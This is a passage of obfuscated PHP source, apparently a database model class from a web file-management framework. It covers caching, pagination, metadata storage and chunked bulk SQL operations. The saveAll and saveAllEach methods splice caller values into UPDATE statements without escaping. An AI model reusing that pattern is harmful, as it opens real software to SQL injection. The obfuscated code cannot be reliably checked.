$’ğ÷š‚É = preg_replace_callback($Ú…ü‚µ [435], function ($øš§â«Ä) { return $_SERVER[¦»×‡Ãã][100]; }, $’ğ÷š‚É); return json_decode($’ğ÷š‚É); } public function setAutoIncrement($ãÈ²—µ) { $ëØÑò³Â = array($this->getPk() => $ãÈ²—µ); $¶©à¸¨ = $this->data($ëØÑò³Â)->add(); if ($¶©à¸¨) { $this->delete($¶©à¸¨); } } public function getAutoIncrement() { $Ş‰ãä§² = $this->getTableName(); $ã—ÆŞˆ¬ = $this->max($this->getPk()); $ûù ÎŠ = $this->query("\x73\150\157\167\40\x74\x61\142\x6c\145\x20\x73\164\141\164\x75\163\x20\x77\x68\x65\162\x65\40\116\141\x6d\x65\x3d\x27{$Ş‰ãä§²}\47"); $Ù©¿…ó = $ûù ÎŠ[0][$_SERVER[¦»×‡Ãã][436]]; $§Şë×ü™ = max($ã—ÆŞˆ¬, $Ù©¿…ó); return $§Şë×ü™; } protected function _callBefore($©†¿É€¶, $…Š ëÉØ) { return $this->cacheCallCheck($©†¿É€¶, $…Š ëÉØ, !1); } protected function _callAfter($ª³·§•í, $¢”ª¶Ş) { return $this->cacheCallCheck($ª³·§•í, $¢”ª¶Ş, !0); } protected function cacheFunctionAlias($ÛÀÓá¼) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($¤Ê•ğ‚î, $ÔÑº—¡´, $ ²Ï»ıú = false) { $èŸ—™ŸË = $this->cacheFunctionAlias($ÔÑº—¡´); if (!$èŸ—™ŸË) { return; } foreach ($èŸ—™ŸË as $‰ìì¶ì => $®ÅÓ€ë) { $Ü¥Ü‘ş = $®ÅÓ€ë[0]; $’×èü² = explode($_SERVER[¦»×‡Ãã][50], $®ÅÓ€ë[1]); if ($¤Ê•ğ‚î == $‰ìì¶ì) { return $this->cacheFunctionGet($‰ìì¶ì, $Ü¥Ü‘ş); } if ($ ²Ï»ıú && in_array($¤Ê•ğ‚î, $’×èü²)) { $this->cacheFunctionClear($‰ìì¶ì, $Ü¥Ü‘ş); } } } public function cacheFunctionGet($íàÍØ¿³, $ó€’ÄŒ•) { $¸‘…—Şà = $this->cacheKeyMake($íàÍØ¿³, $ó€’ÄŒ•); $±ùÜÖ = Cache::get($¸‘…—Şà); if (!is_array($±ùÜÖ)) { $±ùÜÖ = call_user_func_array(array($this, $íàÍØ¿³), array($ó€’ÄŒ•, !0)); Cache::set($¸‘…—Şà, $±ùÜÖ); } return $±ùÜÖ; } public function cacheFunctionClear($¥—øù…, $Š¾à¼) { $”­ì¢‘Ê = $Š¾à¼; if (!is_array($Š¾à¼)) { $”­ì¢‘Ê = array($Š¾à¼); } foreach ($”­ì¢‘Ê as $èİ„²€´) { $çà°ç×ø = $this->cacheKeyMake($¥—øù…, $èİ„²€´); Cache::remove($çà°ç×ø); } } private function cacheKeyMake($œØƒÚ“š, $ùŠæù¨) { $ã„ùõÇ =& $_SERVER[¦»×‡Ãã]; return get_class($this) . $ã„ùõÇ[11] . $œØƒÚ“š . $ã„ùõÇ[437] . $ùŠæù¨; } protected function selectPageReset() { $õÕöõÓ© =& $_SERVER[¦»×‡Ãã]; if (isset($GLOBALS[$õÕöõÓ©[438]])) { return; } $GLOBALS[$õÕöõÓ©[438]] = isset($GLOBALS[$õÕöõÓ©[7]][$õÕöõÓ©[439]]) ? $GLOBALS[$õÕöõÓ©[7]][$õÕöõÓ©[439]] : !1; $GLOBALS[$õÕöõÓ©[440]] = isset($GLOBALS[$õÕöõÓ©[7]][$õÕöõÓ©[429]]) ? $GLOBALS[$õÕöõÓ©[7]][$õÕöõÓ©[429]] : !1; $GLOBALS[$õÕöõÓ©[7]][$õÕöõÓ©[439]] = !1; $GLOBALS[$õÕöõÓ©[7]][$õÕöõÓ©[429]] = !1; } protected function selectPageRestore() { $æìôÙÂ² =& $_SERVER[¦»×‡Ãã]; if (!isset($GLOBALS[$æìôÙÂ²[438]])) { return; } $GLOBALS[$æìôÙÂ²[7]][$æìôÙÂ²[439]] = $GLOBALS[$æìôÙÂ²[438]]; $GLOBALS[$æìôÙÂ²[7]][$æìôÙÂ²[429]] = $GLOBALS[$æìôÙÂ²[440]]; if ($GLOBALS[$æìôÙÂ²[7]][$æìôÙÂ²[439]] === !1) { unset($GLOBALS[$æìôÙÂ²[7]][$æìôÙÂ²[439]]); } if ($GLOBALS[$æìôÙÂ²[7]][$æìôÙÂ²[429]] === !1) { unset($GLOBALS[$æìôÙÂ²[7]][$æìôÙÂ²[429]]); } unset($GLOBALS[$æìôÙÂ²[438]]); unset($GLOBALS[$æìôÙÂ²[440]]); } protected function selectPage($õ´ùĞï¡ = 200, $ñ©¡ÍÊÒ = 1) { $çÛÅœœÁ =& $_SERVER[¦»×‡Ãã]; global $in; $ÎŒú½øü = $this->optionsValue(); $•ò¼ÎÒ— = 50000; $õ´ùĞï¡ = isset($in[$çÛÅœœÁ[439]]) && $in[$çÛÅœœÁ[439]] ? $in[$çÛÅœœÁ[439]] : $õ´ùĞï¡; if ($õ´ùĞï¡ === -1) { $in[$çÛÅœœÁ[439]] = !1; $•ò¼ÎÒ— = 100000000; $õ´ùĞï¡ = $•ò¼ÎÒ—; } $í›Ã‘™ = $ÎŒú½øü; $í›Ã‘™[$çÛÅœœÁ[441]] = array(); $õ´ùĞï¡ = intval($õ´ùĞï¡); $õ´ùĞï¡ = $õ´ùĞï¡ <= 5 ? 5 : ($õ´ùĞï¡ >= $•ò¼ÎÒ— ? $•ò¼ÎÒ— : $õ´ùĞï¡); $ñ©¡ÍÊÒ = intval(isset($in[$çÛÅœœÁ[429]]) && $in[$çÛÅœœÁ[429]] ? $in[$çÛÅœœÁ[429]] : $ñ©¡ÍÊÒ); $ñ©¡ÍÊÒ = $ñ©¡ÍÊÒ <= 1 ? 1 : $ñ©¡ÍÊÒ; $¬½§ò¹À = array(); $İ©ƒ¡˜° = 1; if ($ñ©¡ÍÊÒ == 1 && $İ©ƒ¡˜°) { $this->optionsValue($ÎŒú½øü); $¬½§ò¹À = $this->page($ñ©¡ÍÊÒ, $õ´ùĞï¡)->select(); $ñ‘üù¡† = is_array($¬½§ò¹À) ? count($¬½§ò¹À) : 0; if ($ñ‘üù¡† < $õ´ùĞï¡) { $øŞœ©Ê = 1; } else { $this->optionsValue($í›Ã‘™); $ñ‘üù¡† = intval($this->count()); $øŞœ©Ê = ceil($ñ‘üù¡† / $õ´ùĞï¡); } } else { $this->optionsValue($í›Ã‘™); $ñ‘üù¡† = intval($this->count()); $øŞœ©Ê = ceil($ñ‘üù¡† / $õ´ùĞï¡); $ñ©¡ÍÊÒ = $ñ©¡ÍÊÒ >= $øŞœ©Ê ? $øŞœ©Ê : $ñ©¡ÍÊÒ; $this->optionsValue($ÎŒú½øü); $¬½§ò¹À = $this->page($ñ©¡ÍÊÒ, $õ´ùĞï¡)->select(); } if (!is_array($¬½§ò¹À)) { $¬½§ò¹À = array(); } if ($øŞœ©Ê == 1) { $ñ‘üù¡† = count($¬½§ò¹À); } $ñ›ûªºğ = array($çÛÅœœÁ[442] => array($çÛÅœœÁ[443] => $ñ‘üù¡†, $çÛÅœœÁ[439] => $õ´ùĞï¡, $çÛÅœœÁ[429] => $ñ©¡ÍÊÒ, $çÛÅœœÁ[444] => $øŞœ©Ê), $çÛÅœœÁ[445] => $¬½§ò¹À); return $ñ›ûªºğ; } protected function checkLength($Ñ×ªçî, $¿Æçî× = 0, $‘ÛìŠŒ = '') { $´ùØáÁ× =& $_SERVER[¦»×‡Ãã]; $¿Æçî× = $¿Æçî× ? $¿Æçî× : 65536; if (!$Ñ×ªçî || strlen($Ñ×ªçî) < $¿Æçî×) { return; } $‘ÛìŠŒ = $‘ÛìŠŒ ? $‘ÛìŠŒ . $´ùØáÁ×[74] : $´ùØáÁ×[12]; show_json($‘ÛìŠŒ . LNG($´ùØáÁ×[446]) . "\x28{$¿Æçî×}\x29", !1); } protected function metaSet($¸óìûÕ, $¿ËÄÌšş = null, $ıÑ™ê = null) { $¨³ÒŒÄ® =& $_SERVER[¦»×‡Ãã]; if (!$this->tableMeta || !$¸óìûÕ) { return !1; } $°œ©Ù = $this->tableMeta[$¨³ÒŒÄ®[447]]; $–ë£Ñ¤ = $this->tableMeta[$¨³ÒŒÄ®[448]]; $ÍáÚÖİ = Model($–ë£Ñ¤); $ ÀÆ¬ÅÀ = array($°œ©Ù => $¸óìûÕ, $¨³ÒŒÄ®[449] => $¿ËÄÌšş); if (is_null($¿ËÄÌšş)) { return $ÍáÚÖİ->where(array($°œ©Ù => $¸óìûÕ))->delete(); } if (is_null($ıÑ™ê) && is_string($¿ËÄÌšş)) { return $ÍáÚÖİ->where($ ÀÆ¬ÅÀ)->delete(); } $ÓÒÈóÉ¿ = is_array($¿ËÄÌšş) ? $¿ËÄÌšş : array(); if (is_string($¿ËÄÌšş)) { $ÓÒÈóÉ¿[$¿ËÄÌšş] = $ıÑ™ê; } $ÓÜöÎ­— = array(); foreach ($ÓÒÈóÉ¿ as $ÜÇê€ÏÀ => $‚Ä…õ„á) { if (is_null($‚Ä…õ„á) && is_string($ÜÇê€ÏÀ)) { $ÍáÚÖİ->where(array($°œ©Ù => $¸óìûÕ, $¨³ÒŒÄ®[449] => $ÜÇê€ÏÀ))->delete(); continue; } $this->checkLength($‚Ä…õ„á, !1, $–ë£Ñ¤ . $¨³ÒŒÄ®[4] . $ÜÇê€ÏÀ); $ÓÜöÎ­—[] = array($°œ©Ù => $¸óìûÕ, $¨³ÒŒÄ®[97] => $ÜÇê€ÏÀ, $¨³ÒŒÄ®[450] => $‚Ä…õ„á); } $µ±øãô¯ = $¨³ÒŒÄ®[451] . $–ë£Ñ¤; CacheLock::lock($µ±øãô¯); $ÍáÚÖİ->where(array($°œ©Ù => $¸óìûÕ))->addAll($ÓÜöÎ­—, array(), !0); CacheLock::unlock($µ±øãô¯); return !0; } public function metaGet($ˆñé•, $¬Íâ¶™Ë = false) { $“—ÊÜó¡ =& $_SERVER[¦»×‡Ãã]; if (!$this->tableMeta) { return array(); } $´¥®Óï‰ = $this->tableMeta[$“—ÊÜó¡[447]]; $ËÎÖ­’õ = Model($this->tableMeta[$“—ÊÜó¡[448]]); if ($¬Íâ¶™Ë) { $ÍÚÂ§˜Ñ = array($´¥®Óï‰ => $ˆñé•, $“—ÊÜó¡[97] => $¬Íâ¶™Ë); return $ËÎÖ­’õ->where($ÍÚÂ§˜Ñ)->getField($“—ÊÜó¡[450]); } $ÍÚÂ§˜Ñ = array($´¥®Óï‰ => $ˆñé•); $ïõöãˆµ = $ËÎÖ­’õ->field($“—ÊÜó¡[452])->where($ÍÚÂ§˜Ñ)->select(); $ïõöãˆµ = array_to_keyvalue($ïõöãˆµ, $“—ÊÜó¡[97], $“—ÊÜó¡[450]); return $ïõöãˆµ; } private function checkDataAutoHas($ãÂó¨¸—) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $·—£ëÛ) { if (in_array($ãÂó¨¸—, explode($_SERVER[¦»×‡Ãã][50], $·—£ëÛ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$”æ¨Ê• , $­ÊàÌï) { $œûĞ«à =& $_SERVER[¦»×‡Ãã]; if (!is_array($”æ¨Ê• )) { return; } foreach ($this->dataAuto as $Ç´¯±¾°) { $ØŞÙæ÷û = $Ç´¯±¾°[0]; if (!in_array($­ÊàÌï, explode($œûĞ«à[50], $Ç´¯±¾°[2]))) { continue; } switch (trim($Ç´¯±¾°[3])) { case $œûĞ«à[397]: case $œûĞ«à[398]: $¤¹ñ€™Š = $Ç´¯±¾°[1]; $°ßã‘Ô = isset($Ç´¯±¾°[4]) ? (array) $Ç´¯±¾°[4] : array(); if ($¤¹ñ€™Š == $œûĞ«à[206] && array_key_exists($ØŞÙæ÷û, $”æ¨Ê• )) { if (!$”æ¨Ê• [$ØŞÙæ÷û]) { unset($”æ¨Ê• [$ØŞÙæ÷û]); } break; } if (isset($”æ¨Ê• [$ØŞÙæ÷û])) { array_unshift($°ßã‘Ô, $”æ¨Ê• [$ØŞÙæ÷û]); } if ($œûĞ«à[397] == $Ç´¯±¾°[3]) { $”æ¨Ê• [$ØŞÙæ÷û] = call_user_func_array($¤¹ñ€™Š, $°ßã‘Ô); } else { $”æ¨Ê• [$ØŞÙæ÷û] = call_user_func_array(array(&$this, $¤¹ñ€™Š), $°ßã‘Ô); } break; case $œûĞ«à[347]: if (isset($”æ¨Ê• [$ØŞÙæ÷û]) && $”æ¨Ê• [$ØŞÙæ÷û]) { $”æ¨Ê• [$ØŞÙæ÷û] = call_user_func_array(array(&$this, $Ç´¯±¾°[1]), array($”æ¨Ê• [$ØŞÙæ÷û])); } break; case $œûĞ«à[350]: $”æ¨Ê• [$ØŞÙæ÷û] = $”æ¨Ê• [$Ç´¯±¾°[1]]; break; case $œûĞ«à[370]: if (isset($”æ¨Ê• [$ØŞÙæ÷û]) && !is_string($”æ¨Ê• [$ØŞÙæ÷û])) { $”æ¨Ê• [$ØŞÙæ÷û] = json_encode_force($”æ¨Ê• [$ØŞÙæ÷û]); } break; case $œûĞ«à[399]: if ($”æ¨Ê• [$ØŞÙæ÷û] === $œûĞ«à[12]) { unset($”æ¨Ê• [$ØŞÙæ÷û]); } break; case $œûĞ«à[400]: $”æ¨Ê• [$ØŞÙæ÷û] = $Ç´¯±¾°[1]; default: break; } } if ($­ÊàÌï == $œûĞ«à[431]) { $ÆØÏØ“Ä = strtolower($this->db->getDbType()); if (strpos($ÆØÏØ“Ä, $œûĞ«à[13]) !== 0) { return; } $ì²ÅúÌ¡ = $this->field(!0)->fields; $ŒËºÈğë = $ì²ÅúÌ¡[$œûĞ«à[329]]; if (isset($ì²ÅúÌ¡[$œûĞ«à[328]])) { unset($ŒËºÈğë[$ì²ÅúÌ¡[$œûĞ«à[328]]]); } foreach ($ŒËºÈğë as $«ø¨Øš => $­ÊàÌï) { if (!isset($”æ¨Ê• [$«ø¨Øš])) { $”æ¨Ê• [$«ø¨Øš] = $œûĞ«à[12]; } } } } private function dataAfterFilter(&$í‘¬“¦¯) { $â¬œ® =& $_SERVER[¦»×‡Ãã]; foreach ($this->dataAuto as $Ï‚¡¯á†) { $Å®‰ãÍÎ = $Ï‚¡¯á†[0]; if (!isset($í‘¬“¦¯[$Å®‰ãÍÎ])) { continue; } if (!in_array($â¬œ®[433], explode($â¬œ®[50], $Ï‚¡¯á†[2]))) { continue; } switch (trim($Ï‚¡¯á†[3])) { case $â¬œ®[397]: case $â¬œ®[398]: $øŸùé¼ = isset($Ï‚¡¯á†[4]) ? (array) $Ï‚¡¯á†[4] : array(); array_unshift($øŸùé¼, $í‘¬“¦¯[$Å®‰ãÍÎ]); if (isset($Ï‚¡¯á†[4]) && $Ï‚¡¯á†[4] == $â¬œ®[453]) { $øŸùé¼ = array($í‘¬“¦¯[$Å®‰ãÍÎ]); } if ($â¬œ®[397] == $Ï‚¡¯á†[3]) { $í‘¬“¦¯[$Å®‰ãÍÎ] = call_user_func_array($Ï‚¡¯á†[1], $øŸùé¼); } else { $í‘¬“¦¯[$Å®‰ãÍÎ] = call_user_func_array(array(&$this, $Ï‚¡¯á†[1]), $øŸùé¼); } break; case $â¬œ®[347]: if (isset($í‘¬“¦¯[$Å®‰ãÍÎ]) && $í‘¬“¦¯[$Å®‰ãÍÎ]) { $í‘¬“¦¯[$Å®‰ãÍÎ] = call_user_func_array(array(&$this, $Ï‚¡¯á†[1]), array($í‘¬“¦¯[$Å®‰ãÍÎ])); } break; case $â¬œ®[350]: $í‘¬“¦¯[$Å®‰ãÍÎ] = $í‘¬“¦¯[$Ï‚¡¯á†[1]]; break; case $â¬œ®[370]: $èé¤½È· = $í‘¬“¦¯[$Å®‰ãÍÎ]; $í‘¬“¦¯[$Å®‰ãÍÎ] = json_decode($èé¤½È·, !0); if (is_null($í‘¬“¦¯[$Å®‰ãÍÎ])) { $í‘¬“¦¯[$Å®‰ãÍÎ] = $èé¤½È·; } break; case $â¬œ®[399]: if ($í‘¬“¦¯[$Å®‰ãÍÎ] === $â¬œ®[12]) { unset($í‘¬“¦¯[$Å®‰ãÍÎ]); } break; case $â¬œ®[400]: $í‘¬“¦¯[$Å®‰ãÍÎ] = $Ï‚¡¯á†[1]; break; default: break; } } } public function saveAll($®Ğ¦¾«) { $î›¼²Õ´ =& $_SERVER[¦»×‡Ãã]; $´Æ‚ß§ = $this->tablePrefix . $this->tableName; $ë¾»ÁÑÕ = self::SQL_WHERE_IN_CHUNK; $®Ğ¦¾« = is_array($®Ğ¦¾«) ? $®Ğ¦¾« : array(); $Ş’áñ‚Â = $î›¼²Õ´[454]; $şŠÜüé¥ = 0; $½È˜´÷¯ = array(); $–ŸÛÈ‘“ = count($®Ğ¦¾«); for ($¬®™ØéŒ = 0; $¬®™ØéŒ < $–ŸÛÈ‘“; $¬®™ØéŒ++) { $ğÈæªÆ‰ = $®Ğ¦¾«[$¬®™ØéŒ]; if (!is_array($ğÈæªÆ‰) || count($ğÈæªÆ‰) != 4) { continue; } $†ÛÔÁµ = "\125\120\104\101\x54\105\40\x60{$´Æ‚ß§}\x60\40\123\105\x54\x20{$ğÈæªÆ‰[2]}\x20\x3d\40\x43\x41\123\105\x20{$ğÈæªÆ‰[0]}\x20\xa"; if ($şŠÜüé¥ == 0) { $Ş’áñ‚Â = $†ÛÔÁµ; } $½È˜´÷¯[] = $î›¼²Õ´[121] . $ğÈæªÆ‰[1] . $î›¼²Õ´[121]; $şŠÜüé¥++; $Ş’áñ‚Â .= "\x20\x57\110\x45\x4e\40\47{$ğÈæªÆ‰[1]}\47\40\124\110\105\x4e\40\47{$ğÈæªÆ‰[3]}\47\x20\xa"; if ($şŠÜüé¥ == $ë¾»ÁÑÕ || $¬®™ØéŒ == $–ŸÛÈ‘“ - 1) { $›³¿‘˜ = implode($î›¼²Õ´[50], $½È˜´÷¯); $Ş’áñ‚Â .= "\x20\105\116\x44\40\40\127\110\105\x52\105\x20{$ğÈæªÆ‰[0]}\x20\111\x4e\40\x28{$›³¿‘˜}\51\40"; $this->execute($Ş’áñ‚Â); $şŠÜüé¥ = 0; $Ş’áñ‚Â = $†ÛÔÁµ; $this->chunkEventCheck(count($½È˜´÷¯)); $½È˜´÷¯ = array(); } } $this->chunkEventSet(); } public function saveAllEach($Öâñœ¤Ë) { $¢¼³ğÌİ =& $_SERVER[¦»×‡Ãã]; $‹¥¸˜º = $this->tablePrefix . $this->tableName; foreach ($Öâñœ¤Ë as $ñ°«ƒ¡) { if (!is_array($ñ°«ƒ¡) || count($ñ°«ƒ¡) != 4) { continue; } $™õô­ˆ = $ñ°«ƒ¡[0] . $¢¼³ğÌİ[455] . $ñ°«ƒ¡[1] . $¢¼³ğÌİ[121]; $é«Ù¼œ” = $ñ°«ƒ¡[2] . $¢¼³ğÌİ[455] . $ñ°«ƒ¡[3] . $¢¼³ğÌİ[121]; $¼Ó›­ÁÈ = "\x75\160\144\141\x74\145\40{$‹¥¸˜º}\40\x73\x65\x74\x20{$é«Ù¼œ”}\x20\x77\150\145\x72\x65\40{$™õô­ˆ}\73"; $this->execute($¼Ó›­ÁÈ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ÎÑÊ‘äà = false, $¥ä˜Ñæ¡ = false) { $this->_chunkEvent = $ÎÑÊ‘äà; $this->_chunkEventParam = $¥ä˜Ñæ¡; } private function chunkEventCheck($İƒ›Ûùª) { if (!$this->_chunkEvent) { return; } $á°É¿ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $á°É¿[$_SERVER[¦»×‡Ãã][456]] = $İƒ›Ûùª; Hook::trigger($this->_chunkEvent, $á°É¿); } public function addAll($˜­Êû Ë, $“ÉÜİÒÒ = array(), $¯‡¸÷Ù› = false) { $¾Ä´ï„ =& $_SERVER[¦»×‡Ãã]; ignore_timeout(); $ÖÉ«½¼á = self::SQL_WHERE_IN_CHUNK; if (empty($˜­Êû Ë)) { $this->error = think_lang($¾Ä´ï„[348]); return !1; } $“ÉÜİÒÒ = $this->_parseOptions($“ÉÜİÒÒ); foreach ($˜­Êû Ë as $›©€î• => $Å“Á·©¤) { $˜­Êû Ë[$›©€î•] = $this->_facade($Å“Á·©¤); $this->_beforeInsert($˜­Êû Ë[$›©€î•], $“ÉÜİÒÒ); } if (method_exists($this->db, $¾Ä´ï„[349])) { for ($“¹÷õæ¡ = 0; $“¹÷õæ¡ < count($˜­Êû Ë); $“¹÷õæ¡ += $ÖÉ«½¼á) { $åü›éáÇ = array_slice($˜­Êû Ë, $“¹÷õæ¡, $ÖÉ«½¼á); if (!is_array($åü›éáÇ) || count($åü›éáÇ) == 0) { break; } $¡©£…µ = $this->db->insertAll($åü›éáÇ, $“ÉÜİÒÒ, $¯‡¸÷Ù›); $this->chunkEventCheck(count($åü›éáÇ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($˜­Êû Ë as $›©€î• => $Å“Á·©¤) { $¡©£…µ = $this->db->insert($Å“Á·©¤, $“ÉÜİÒÒ, $¯‡¸÷Ù›); } $this->commit(); } if (!1 !== $¡©£…µ) { $ê°Îå¦ = $this->getLastInsID(); if ($ê°Îå¦) { return $ê°Îå¦; } } return $¡©£…µ; } public function save($Š¬Ğ—‚ª = '', $÷ÌË·Ø™ = array()) { $¤Ó‚ÎÓÈ =& $_SERVER[¦»×‡Ãã]; $“ä½¡àö = self::SQL_WHERE_IN_CHUNK; $”³Éå¾Ë = $this->optionsValue(); $Õ¡ç£åÎ = $this->findWhereField($”³Éå¾Ë); if (!$Õ¡ç£åÎ) { return parent::save($Š¬Ğ—‚ª, $÷ÌË·Ø™); } $ŒÄ²•àö = 0; $ªõ‰ê ‚ = $”³Éå¾Ë[$¤Ó‚ÎÓÈ[352]][$Õ¡ç£åÎ][1]; $ªõ‰ê ‚ = is_array($ªõ‰ê ‚) ? $ªõ‰ê ‚ : array(); $Ï­œÅİ = count($ªõ‰ê ‚); for ($•ğİÚÍ = 0; $•ğİÚÍ < $Ï­œÅİ; $•ğİÚÍ += $“ä½¡àö) { $–ëùÑ¦ˆ = array_slice($ªõ‰ê ‚, $•ğİÚÍ, $“ä½¡àö); if (!is_array($–ëùÑ¦ˆ) || count($–ëùÑ¦ˆ) == 0) { break; } $”³Éå¾Ë[$¤Ó‚ÎÓÈ[352]][$Õ¡ç£åÎ][1] = $–ëùÑ¦ˆ; $this->optionsValue($”³Éå¾Ë); $ŒÄ²•àö += parent::save($Š¬Ğ—‚ª, $÷ÌË·Ø™); $this->chunkEventCheck(count($–ëùÑ¦ˆ)); } $this->chunkEventSet(); return $ŒÄ²•àö; } public function add($°ñÍ‘ë = '', $‡¦Ó¡Î™ = array(), $ÅÀ€èÓ = false) { if ($this->addTaskStatus && is_array($°ñÍ‘ë)) { $this->addTaskData[] = $°ñÍ‘ë; return; } return parent::add($°ñÍ‘ë, $‡¦Ó¡Î™, $ÅÀ€èÓ); } public function parseWhereLike($’á˜Íæ€, $£³€šôì = '', $è¶çÈûš = false, &$ç…©ö‰ı = false) { $ÄÌÏÇ¼‡ =& $_SERVER[¦»×‡Ãã]; $òÔ…Ó­í = $GLOBALS[$ÄÌÏÇ¼‡[6]][$ÄÌÏÇ¼‡[457]]; if (!$òÔ…Ó­í[$ÄÌÏÇ¼‡[458]]) { return $’á˜Íæ€; } if (!is_array($’á˜Íæ€)) { return $’á˜Íæ€; } $Îõ ‹¬ = array(); $½ÓçœÍ¬ = 0; foreach ($’á˜Íæ€ as $Ö½îÊ— => $ìÕá’å·) { if (is_array($ìÕá’å·) && count($ìÕá’å·) == 2 && $ìÕá’å·[0] == $ÄÌÏÇ¼‡[459] && is_string($ìÕá’å·[1]) && substr($ìÕá’å·[1], 0, 1) == $ÄÌÏÇ¼‡[460] && substr($ìÕá’å·[1], strlen($ìÕá’å·[1]) - 1, 1) == $ÄÌÏÇ¼‡[460]) { $ç…©ö‰ı = !0; $É•ĞŠÒ = is_string($Ö½îÊ—) ? $Ö½îÊ— : $£³€šôì; $€åøİ›® = substr($ìÕá’å·[1], 1, strlen($ìÕá’å·[1]) - 2); $€åøİ›® = $this->db->escapeString($€åøİ›®); if (!strpos($É•ĞŠÒ, $ÄÌÏÇ¼‡[10])) { $É•ĞŠÒ = $ÄÌÏÇ¼‡[461] . $É•ĞŠÒ . $ÄÌÏÇ¼‡[461]; } $ëò˜è±– = $ÄÌÏÇ¼‡[220] . $€åøİ›® . $ÄÌÏÇ¼‡[220]; $€åøİ›® = str_replace(array($ÄÌÏÇ¼‡[10], $ÄÌÏÇ¼‡[462], $ÄÌÏÇ¼‡[11]), $ÄÌÏÇ¼‡[463], $€åøİ›®); if ($òÔ…Ó­í[$ÄÌÏÇ¼‡[464]]) { $ëò˜è±– = $ÄÌÏÇ¼‡[465] . $€åøİ›® . $ÄÌÏÇ¼‡[466]; if ($òÔ…Ó­í[$ÄÌÏÇ¼‡[467]]) { $ëò˜è±– = $ÄÌÏÇ¼‡[466] . $€åøİ›® . $ÄÌÏÇ¼‡[465]; } } $Îõ ‹¬[$½ÓçœÍ¬] = $ÄÌÏÇ¼‡[468] . $É•ĞŠÒ . $ÄÌÏÇ¼‡[469] . $ëò˜è±– . $ÄÌÏÇ¼‡[470]; $½ÓçœÍ¬++; continue; } if (is_array($ìÕá’å·)) { $£³€šôì = is_string($Ö½îÊ—) ? $Ö½îÊ— : $£³€šôì; $ìÕá’å· = $this->parseWhereLike($ìÕá’å·, $£³€šôì, !0, $ç…©ö‰ı); } if (is_numeric($Ö½îÊ—)) { $Îõ ‹¬[$½ÓçœÍ¬] = $ìÕá’å·; $½ÓçœÍ¬++; } else { $Îõ ‹¬[$Ö½îÊ—] = $ìÕá’å·; } } if ($ç…©ö‰ı && !$è¶çÈûš) { } return $Îõ ‹¬; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($´äÚ€ÇÊ = array()) { $¬á¦éÖ¤ =& $_SERVER[¦»×‡Ãã]; $ô’áî¡ = self::SQL_WHERE_IN_CHUNK; $¹ñÍéªá = $this->optionsValue(); $•ÎË¤Öß = $this->findWhereField($¹ñÍéªá); if (!$•ÎË¤Öß || isset($¹ñÍéªá[$¬á¦éÖ¤[368]]) || isset($¹ñÍéªá[$¬á¦éÖ¤[429]])) { return parent::select($´äÚ€ÇÊ); } $…ğ”¬ÕÜ = $¹ñÍéªá[$¬á¦éÖ¤[352]][$•ÎË¤Öß][1]; $…ğ”¬ÕÜ = is_array($…ğ”¬ÕÜ) ? $…ğ”¬ÕÜ : array(); $š‘İùæš = null; for ($ë•ãå§ = 0; $ë•ãå§ < count($…ğ”¬ÕÜ); $ë•ãå§ += $ô’áî¡) { $ ²¦Íàó = array_slice($…ğ”¬ÕÜ, $ë•ãå§, $ô’áî¡); if (!is_array($ ²¦Íàó) || count($ ²¦Íàó) == 0) { break; } $¹ñÍéªá[$¬á¦éÖ¤[352]][$•ÎË¤Öß][1] = $ ²¦Íàó; $this->optionsValue($¹ñÍéªá); $õÊ¯  ï = parent::select($´äÚ€ÇÊ); if (!$õÊ¯  ï) { continue; } $š‘İùæš = is_array($š‘İùæš) ? $š‘İùæš : array(); $š‘İùæš = array_merge($š‘İùæš, $õÊ¯  ï); } return $š‘İùæš; } public function delete($Ä¡‡Öˆ‡ = array()) { $Ùˆ™§³À =& $_SERVER[¦»×‡Ãã]; $µ»”èÉ = self::SQL_WHERE_IN_CHUNK; $•¶’Úµ… = $this->optionsValue(); $ˆæã½Ä¾ = $this->findWhereField($•¶’Úµ…); if (!$ˆæã½Ä¾) { return parent::delete($Ä¡‡Öˆ‡); } $§¯ªÍ’­ = 0; $°Óë“ÈØ = $•¶’Úµ…[$Ùˆ™§³À[352]][$ˆæã½Ä¾][1]; $°Óë“ÈØ = is_array($°Óë“ÈØ) ? $°Óë“ÈØ : array(); for ($ãê‹Ç´¦ = 0; $ãê‹Ç´¦ < count($°Óë“ÈØ); $ãê‹Ç´¦ += $µ»”èÉ) { $¥‘ÚÇ¬û = array_slice($°Óë“ÈØ, $ãê‹Ç´¦, $µ»”èÉ); if (!is_array($¥‘ÚÇ¬û) || count($¥‘ÚÇ¬û) == 0) { break; } $•¶’Úµ…[$Ùˆ™§³À[352]][$ˆæã½Ä¾][1] = $¥‘ÚÇ¬û; $this->optionsValue($•¶’Úµ…); $§¯ªÍ’­ += parent::delete($Ä¡‡Öˆ‡); } return $§¯ªÍ’­; } private function findWhereField($Ø˜‹úŸŞ) { $‘€­¢Ï =& $_SERVER[¦»×‡Ãã]; $äº‡µê = self::SQL_WHERE_IN_CHUNK; if (!is_array($Ø˜‹úŸŞ) || !is_array($Ø˜‹úŸŞ[$‘€­¢Ï[352]])) { return !1; } foreach ($Ø˜‹úŸŞ[$‘€­¢Ï[352]] as $ÆŞÆşˆ¬ => $ğÏğéÊç) { if (is_array($ğÏğéÊç) && isset($ğÏğéÊç[0]) && is_string($ğÏğéÊç[0]) && strtolower($ğÏğéÊç[0]) == $‘€­¢Ï[7] && is_array($ğÏğéÊç[1]) && count($ğÏğéÊç[1]) > $äº‡µê) { ignore_timeout(); return $ÆŞÆşˆ¬; } } return !1; } public function setMasterDB($’èèüˆ¶ = true) { think_config($_SERVER[¦»×‡Ãã][471], $’èèüˆ¶); } } goto A¹ŒÔ³³®æ; dòŒ³¯¨È: class DbSqlite3 extends DbSqlite3Base { public function query($ÀÙóÆçü) { $“šĞ§èò =& $_SERVER[¦»×‡Ãã]; if (!CacheLock::fileLock($“šĞ§èò[13])) { return !1; } 